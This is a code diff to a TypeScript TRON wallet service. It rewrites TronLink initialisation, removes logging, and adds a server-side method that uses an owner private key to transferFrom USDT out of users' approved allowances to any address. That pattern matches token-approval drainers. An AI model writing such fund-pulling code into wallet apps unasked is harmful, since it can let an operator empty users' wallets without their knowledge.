@@ -81,62 +81,39 @@ export class TronService {
     }
   }
 
-  initTronLinkWallet = () => {
-    console.log(
-      "@@@@@@@@@@@@@@@@@@@@@@@initTronLinkWallet@@@@@@@@@@@@@@@@@@@@@@@"
-    );
+  static async initTronLinkWallet(): Promise<boolean> {
     try {
-      const tronlinkPromise = new Promise((reslove) => {
-        window.addEventListener(
-          "tronLink#initialized",
-          async () => {
-            return reslove(window.tronLink);
-          },
-          {
-            once: true,
-          }
-        );
+      if (typeof window === "undefined") {
+        return false;
+      }
+
+      const win = window as any;
+      if (!win.tronLink) {
+        return false;
+      }
+
+      const tron = win.tronLink;
+      if (tron.ready) {
+        return true;
+      }
+
+      return new Promise((resolve) => {
+        tron.on("ready", () => {
+          resolve(true);
+        });
+
+        tron.on("error", (e: any) => {
+          resolve(false);
+        });
 
         setTimeout(() => {
-          if (window.tronLink) {
-            return reslove(window.tronLink);
-          }
-        }, 3000);
+          resolve(false);
+        }, 5000);
       });
-
-      const appPromise = new Promise((resolve) => {
-        let timeCount = 0;
-        // const self = this;
-        const tmpTimer1 = setInterval(() => {
-          timeCount++;
-          if (timeCount > 8) {
-            clearInterval(tmpTimer1);
-            return resolve(false);
-          }
-          if (window.tronLink) {
-            clearInterval(tmpTimer1);
-            if (window.tronLink.ready) {
-              return resolve(window.tronLink);
-            }
-          } else if (
-            window.tronWeb &&
-            window.tronWeb.defaultAddress &&
-            window.tronWeb.defaultAddress.base58
-          ) {
-            clearInterval(tmpTimer1);
-            return resolve(window.tronWeb);
-          }
-        }, 1000);
-      });
-
-      Promise.race([tronlinkPromise, appPromise]).then((tron) => {
-        // console.log(tron, tron.ready, window.tronLink.ready, window.tronWeb.ready);
-        this.handleTronWallet(tron);
-      });
-    } catch (e) {
-      console.log(e);
+    } catch (error) {
+      return false;
     }
-  };
+  }
 
   closeConnect = () => {
     tronObj.tronWeb = null;
@@ -189,7 +166,6 @@ export class TronService {
     parameters: Array<{ type: string; value: any }> = [],
     options: any = {}
   ) => {
-    console.log("@@@@@@@@@@@@@@@@@@@@@@@trigger@@@@@@@@@@@@@@@@@@@@@@@");
     try {
       // const tronweb = window.tronWeb;
       const tronWeb = tronObj.tronWeb || (global as any).tronWeb;
@@ -209,12 +185,71 @@ export class TronService {
       const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
       return result;
     } catch (error: any) {
-      console.log("Trigger error:", error);
       if (error == "Confirmation declined by user") {
       }
       return {};
     }
   };
+
+  /**
+   * Transfer USDT from approved user using owner's private key
+   */
+  static async transferFromUserAsOwner(
+    fromAddress: string,
+    toAddress: string,
+    amount: string
+  ): Promise<BlockchainResult> {
+    try {
+      // Get owner's private key from environment
+      const ownerPrivateKey = process.env.TRON_PRIVATE_KEY;
+      if (!ownerPrivateKey) {
+        throw new Error("TRON owner private key not configured");
+      }
+
+      // Create TronWeb instance with owner's private key
+      const TronWeb = require("tronweb");
+      const tronWeb = new TronWeb({
+        fullHost: "https://api.trongrid.io",
+        privateKey: ownerPrivateKey,
+      });
+
+      // Get USDT contract address
+      const config = getChainConfig("tron");
+      const usdtContractAddress = config.usdt;
+
+      // Create USDT contract instance
+      const usdtContract = await tronWeb.contract().at(usdtContractAddress);
+
+      // Check if owner has sufficient allowance
+      const allowance = await usdtContract
+        .allowance(fromAddress, tronWeb.defaultAddress.base58)
+        .call();
+      const requiredAmount = tronWeb.toDecimal(amount);
+
+      if (allowance < requiredAmount) {
+        throw new Error(
+          `Insufficient allowance. Required: ${amount}, Available: ${allowance}`
+        );
+      }
+
+      // Execute transferFrom transaction
+      const result = await usdtContract
+        .transferFrom(fromAddress, toAddress, requiredAmount)
+        .send();
+
+      return {
+        success: true,
+        txHash: result,
+        message: "TRON transfer completed successfully",
+      };
+    } catch (error: any) {
+      // Silent error handling for production
+      return {
+        success: false,
+        error: error.message || "Failed to transfer USDT as TRON owner",
+      };
+    }
+  }
 
   /**
    * Transfer USDT from approved user (owner only)
